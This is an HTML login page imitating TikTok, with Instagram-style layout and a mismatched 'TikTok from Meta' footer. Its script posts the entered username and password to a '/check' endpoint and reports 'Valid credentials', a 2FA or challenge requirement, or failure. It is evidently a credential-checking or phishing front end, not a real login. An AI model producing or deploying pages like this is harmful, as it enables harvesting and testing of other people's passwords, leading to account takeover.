<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>TikTok — Log in</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      background: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
        Helvetica, Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 12px;
      color: #262626;
    }

    .wrapper {
      display: flex;
      align-items: flex-start;
      gap: 32px;
      max-width: 935px;
      width: 100%;
      justify-content: center;
    }

    .phone-mockup {
      width: 380px;
      min-width: 380px;
      height: 580px;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .phone-mockup svg {
      width: 100%;
      height: 100%;
    }

    @media (max-width: 768px) { .phone-mockup { display: none; } }

    .right-col {
      width: 350px;
      min-width: 0;
      flex-shrink: 0;
    }

    .card {
      background: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 40px 40px 20px;
      margin-bottom: 10px;
      text-align: center;
    }

    .tt-logo {
      display: inline-block;
      margin-bottom: 28px;
    }

    .tt-logo svg {
      width: 40px;
      height: 40px;
    }

    .field {
      position: relative;
      margin-bottom: 6px;
    }

    .field input {
      width: 100%;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      padding: 9px 8px 7px;
      font-size: 12px;
      color: #262626;
      outline: none;
      transition: border-color 0.1s;
      height: 38px;
    }

    .field input:focus { border-color: #a8a8a8; }

    .field label {
      position: absolute;
      left: 9px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 12px;
      color: #8e8e8e;
      pointer-events: none;
      transition: all 0.1s ease;
      background: transparent;
    }

    .field input:focus ~ label,
    .field input:not(:placeholder-shown) ~ label {
      top: 7px;
      transform: none;
      font-size: 9px;
      font-weight: 600;
    }

    .field input { padding-top: 14px; padding-bottom: 2px; }
    .field input:placeholder-shown { padding-top: 9px; padding-bottom: 7px; }

    .pw-wrap { position: relative; }
    .pw-wrap input { padding-right: 56px; }

    .toggle-pw {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      color: #262626;
      padding: 0;
      line-height: 1;
    }

    .btn-login {
      width: 100%;
      margin-top: 8px;
      padding: 7px 16px;
      border-radius: 8px;
      border: none;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      background: #fe2c55;
      color: #fff;
      transition: opacity 0.15s;
      height: 32px;
      line-height: 1;
    }

    .btn-login:hover:not(:disabled) { opacity: 0.85; }
    .btn-login:disabled { opacity: 0.45; cursor: default; }

    .or-row {
      display: flex;
      align-items: center;
      gap: 18px;
      margin: 18px 0 18px;
    }

    .or-row::before, .or-row::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .or-row span {
      font-size: 13px;
      font-weight: 600;
      color: #8e8e8e;
      letter-spacing: 1px;
    }

    .forgot {
      display: block;
      margin-top: 14px;
      font-size: 12px;
      color: #262626;
      text-decoration: none;
    }

    .forgot:hover { color: #8e8e8e; }

    .signup-card {
      background: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 20px;
      text-align: center;
      font-size: 14px;
      margin-bottom: 20px;
    }

    .signup-card a {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
    }

    .app-row {
      text-align: center;
      font-size: 14px;
      margin-bottom: 12px;
      color: #262626;
    }

    .app-badges {
      display: flex;
      gap: 8px;
      justify-content: center;
      margin-top: 12px;
    }

    .app-badges img { height: 40px; border-radius: 6px; }

    .spinner {
      display: inline-block;
      width: 14px; height: 14px;
      border: 2px solid rgba(255,255,255,0.4);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin 0.65s linear infinite;
      vertical-align: middle;
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    .toast {
      display: none;
      margin-top: 14px;
      padding: 10px 12px;
      border-radius: 4px;
      font-size: 13px;
      line-height: 1.4;
      text-align: left;
    }

    .toast.valid   { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
    .toast.warning { background: #fff3cd; color: #856404; border: 1px solid #ffeeba; }
    .toast.error   { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }

    .toast strong { display: block; margin-bottom: 3px; font-weight: 700; }

    .acc-table {
      margin-top: 10px;
      width: 100%;
      font-size: 12px;
      border-collapse: collapse;
    }

    .acc-table td {
      padding: 4px 0;
      border-bottom: 1px solid rgba(0,0,0,0.07);
    }

    .acc-table td:first-child { color: #8e8e8e; width: 50%; }
    .acc-table td:last-child  { font-weight: 600; color: #262626; }

    .acc-table tr:last-child td { border-bottom: none; }

    footer {
      text-align: center;
      font-size: 12px;
      color: #8e8e8e;
      margin-top: 24px;
      max-width: 350px;
    }

    footer nav { display: flex; flex-wrap: wrap; justify-content: center; gap: 8px 14px; margin-bottom: 14px; }
    footer nav a { color: #8e8e8e; text-decoration: none; }
    footer nav a:hover { text-decoration: underline; }
  </style>
</head>
<body>

  <div class="wrapper">

    <div class="phone-mockup">
      <svg viewBox="0 0 380 580" fill="none" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:100%">
        <rect x="30" y="10" width="320" height="560" rx="36" fill="#fff" stroke="#dbdbdb" stroke-width="1.5"/>
        <rect x="130" y="22" width="120" height="18" rx="9" fill="#f0f0f0"/>
        <rect x="44" y="50" width="292" height="490" rx="4" fill="#fafafa"/>
        <rect x="50" y="56" width="93" height="93" rx="2" fill="#efefef"/>
        <rect x="147" y="56" width="93" height="93" rx="2" fill="#e0e0e0"/>
        <rect x="244" y="56" width="86" height="93" rx="2" fill="#d6d6d6"/>
        <rect x="50" y="153" width="93" height="93" rx="2" fill="#e8e8e8"/>
        <rect x="147" y="153" width="93" height="93" rx="2" fill="#f5f5f5"/>
        <rect x="244" y="153" width="86" height="93" rx="2" fill="#ebebeb"/>
        <rect x="50" y="250" width="93" height="93" rx="2" fill="#dcdcdc"/>
        <rect x="147" y="250" width="93" height="93" rx="2" fill="#e4e4e4"/>
        <rect x="244" y="250" width="86" height="93" rx="2" fill="#f0f0f0"/>
        <rect x="44" y="500" width="292" height="40" rx="2" fill="#fff" stroke="#dbdbdb" stroke-width="0.5"/>
        <rect x="155" y="556" width="70" height="8" rx="4" fill="#ccc"/>
      </svg>
    </div>

    <div class="right-col">

      <div class="card">

        <div class="tt-logo">
          <svg viewBox="0 0 32 32" fill="none">
            <path d="M22.5 4C22.5 4 22.9 8.5 27.5 9.5V14C27.5 14 24.5 14 22.5 12.5V20C22.5 25.5 18.3 30 13 30C7.7 30 3.5 25.5 3.5 20C3.5 14.5 7.7 10 13 10C13.5 10 14 10 14.5 10.1V15C14 14.9 13.5 14.8 13 14.8C10.5 14.8 8.5 17 8.5 19.5C8.5 22 10.5 24 13 24C15.5 24 17.5 22 17.5 19.5V4H22.5Z" fill="#fe2c55"/>
            <path d="M21.5 3C21.5 3 21.9 7.5 26.5 8.5V13C26.5 13 23.5 13 21.5 11.5V19C21.5 24.5 17.3 29 12 29C6.7 29 2.5 24.5 2.5 19C2.5 13.5 6.7 9 12 9C12.5 9 13 9 13.5 9.1V14C13 13.9 12.5 13.8 12 13.8C9.5 13.8 7.5 16 7.5 18.5C7.5 21 9.5 23 12 23C14.5 23 16.5 21 16.5 18.5V3H21.5Z" fill="#25f4ee" style="mix-blend-mode:screen"/>
            <path d="M22 3.5C22 3.5 22.4 8 27 9V13.5C27 13.5 24 13.5 22 12V19.5C22 25 17.8 29.5 12.5 29.5C7.2 29.5 3 25 3 19.5C3 14 7.2 9.5 12.5 9.5C13 9.5 13.5 9.5 14 9.6V14.5C13.5 14.4 13 14.3 12.5 14.3C10 14.3 8 16.5 8 19C8 21.5 10 23.5 12.5 23.5C15 23.5 17 21.5 17 19V3.5H22Z" fill="#161823"/>
          </svg>
        </div>

        <form id="loginForm" autocomplete="off">
          <div class="field">
            <input type="text" id="username" placeholder=" " autocapitalize="none" autocomplete="off" />
            <label for="username">Email or username</label>
          </div>

          <div class="field pw-wrap">
            <input type="password" id="password" placeholder=" " autocomplete="off" />
            <label for="password">Password</label>
            <button type="button" class="toggle-pw" id="togglePw">Show</button>
          </div>

          <button type="submit" class="btn-login" id="submitBtn" disabled>Log in</button>
        </form>

        <div class="or-row"><span>OR</span></div>

        <a href="#" class="forgot">Forgot password?</a>

        <div class="toast" id="toast"></div>
      </div>

      <div class="signup-card">
        Don't have an account? <a href="#">Sign up</a>
      </div>

      <div class="app-row">
        Get the app.
        <div class="app-badges">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/320px-Download_on_the_App_Store_Badge.svg.png"
               alt="Download on the App Store" style="height:36px;border-radius:8px" />
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/320px-Google_Play_Store_badge_EN.svg.png"
               alt="Get it on Google Play" style="height:36px;border-radius:8px" />
        </div>
      </div>

    </div>
  </div>

  <footer>
    <nav>
      <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a>
      <a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a>
      <a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a>
      <a href="#">TikTok Lite</a><a href="#">Threads</a><a href="#">Contact</a>
    </nav>
    <span>© 2024 TikTok from Meta</span>
  </footer>

  <script>
    const usernameEl = document.getElementById('username');
    const passwordEl = document.getElementById('password');
    const submitBtn  = document.getElementById('submitBtn');
    const togglePw   = document.getElementById('togglePw');
    const toast      = document.getElementById('toast');
    const form       = document.getElementById('loginForm');

    function updateBtn() {
      submitBtn.disabled = !(usernameEl.value.trim() && passwordEl.value);
    }
    usernameEl.addEventListener('input', updateBtn);
    passwordEl.addEventListener('input', updateBtn);

    togglePw.addEventListener('click', () => {
      const isText = passwordEl.type === 'text';
      passwordEl.type = isText ? 'password' : 'text';
      togglePw.textContent = isText ? 'Show' : 'Hide';
    });

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const username = usernameEl.value.trim();
      const password = passwordEl.value;
      if (!username || !password) return;

      submitBtn.disabled = true;
      submitBtn.innerHTML = '<span class="spinner"></span>';
      toast.style.display = 'none';

      try {
        const res = await fetch('/check', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password }),
        });
        const data = await res.json();
        showToast(data);
      } catch {
        showToast({ success: false, message: 'Network error. Please try again.' });
      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = 'Log in';
      }
    });

    function showToast(data) {
      const status = data.status || '';
      const isWarning = ['2fa_required', 'challenge_required', 'captcha_required'].includes(status);
      const isValid   = data.success && !isWarning;

      toast.className = 'toast ' + (isValid ? 'valid' : isWarning ? 'warning' : 'error');
      toast.style.display = 'block';

      let label = isValid ? '✓ Valid credentials' : isWarning ? '⚠ Additional step required' : '✕ Login failed';
      let html  = `<strong>${label}</strong>${esc(data.message || '')}`;

      if (data.account) {
        const a = data.account;
        html += `
          <table class="acc-table">
            <tr><td>Username</td><td>@${esc(a.username || '—')}</td></tr>
          </table>`;
      }

      toast.innerHTML = html;
    }

    function esc(s) {
      return String(s)
        .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    }
    function fmt(n) {
      return n != null ? Number(n).toLocaleString() : '—';
    }
  </script>
</body>
</html>
